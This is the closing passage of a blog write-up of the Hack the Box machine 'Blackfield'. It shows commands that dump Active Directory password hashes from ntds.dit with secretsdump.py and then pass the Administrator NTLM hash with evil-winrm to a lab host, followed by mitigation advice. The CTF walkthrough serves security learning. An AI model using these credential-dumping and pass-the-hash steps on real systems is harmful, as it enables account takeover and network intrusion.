</span></pre></table></code></div></div><p>Finally, we will download the two files, the <code class="language-plaintext highlighter-rouge">ntds.dit</code> and <code class="language-plaintext highlighter-rouge">system.hive</code> files, to our local box, where we can dump credentials.</p><p><img data-src="/assets/img/posts/htb/07-2020-5/downloads.png" alt="" data-proofer-ignore></p><p>Back on our box, we’ll use the <code class="language-plaintext highlighter-rouge">secretsdump.py</code> command from Impacket with the SYSTEM hive and <code class="language-plaintext highlighter-rouge">ntds.dit</code> file as the parameters.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>secretsdump.py <span class="nt">-system</span> system.hive <span class="nt">-ntds</span> ntds.dit LOCAL <span class="o">&gt;</span> secretsdump.txt
</pre></table></code></div></div><p>From this, we receive a lot of information, but most importantly, we receive the Administrator NTLM hash. Using the same pass-the-hash attack from earlier, we should be able to remotely access the box again, now as the admin.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-u</span> Administrator <span class="nt">-H</span> 184fb5e5178480be64824d4cd53b99ee <span class="nt">-i</span> 10.10.10.192
</pre></table></code></div></div><p>Success, let’s grab the final flag.</p><p><img data-src="/assets/img/posts/htb/07-2020-5/root-flag.png" alt="" data-proofer-ignore></p><hr /><h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>This mitigation is similar to the one from my <em>Sauna</em> box write-up. There a few ways to mitigate the risk of kerberoasting; a strong password policy helps alleviate the chance that someone will crack a hash. Additionally, avoid accounts with pre-authentication. If an organization must have that enabled, they need to have very complex passwords, as the hash is readily exposed. It goes without saying, though, that even if the hash can’t be cracked, pass-the-hash attacks can still occur.</p><li><p>If something as important as the LSASS memory has been dumped, like in this case, then best practice should be changing the passwords for accounts that were included in the dump, or disabling the accounts. Special considerations should be taken when a file like this is created.</p><li><p>A lot of group policies can be abused and an administrator should carefully consider access to accounts with abusable groups. In this case, a user that can take create backups is especially dangerous, as abuse of this can dump credentials on the machine. This can be devastating on a domain controller.</p></ul><h2 id="final-thoughts"><span class="mr-2">Final Thoughts</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I really enjoyed this box. It was my first <strong>Hard</strong> difficulty box and it was definitely tough, but I learned a lot and it was satisfying to complete. I felt it had a lot of realistic aspects, and I really enjoyed the back-and-forth as we found creds and had to backtrack to services we had previously enumerated.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Blackfield - TidalSec&amp;url=https://tid4l.github.io/posts/HTB-Blackfield/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Blackfield - TidalSec&amp;u=https://tid4l.github.io/posts/HTB-Blackfield/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tid4l.github.io/posts/HTB-Blackfield/&amp;text=Hack the Box - Blackfield - TidalSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/">First Post and Obligatory Blog Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Sauna/"><div class="card-body"> <em class="timeago small" data-ts="1591466400" > 2020-06-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sauna</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Windows machine Sauna. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t atte...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Remote/"><div class="card-body"> <em class="timeago small" data-ts="1593799200" > 2020-07-03 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Remote</h3><div class="text-muted small"><p> This writeup is for the HackTheBox Windows machine Remote. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t att...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Cascade/"><div class="card-body"> <em class="timeago small" data-ts="1593972000" > 2020-07-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cascade</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Windows machine Cascade. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t at...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Cascade/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Cascade</p></a> <a href="/posts/HTB-Fuse/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Fuse</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Chris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
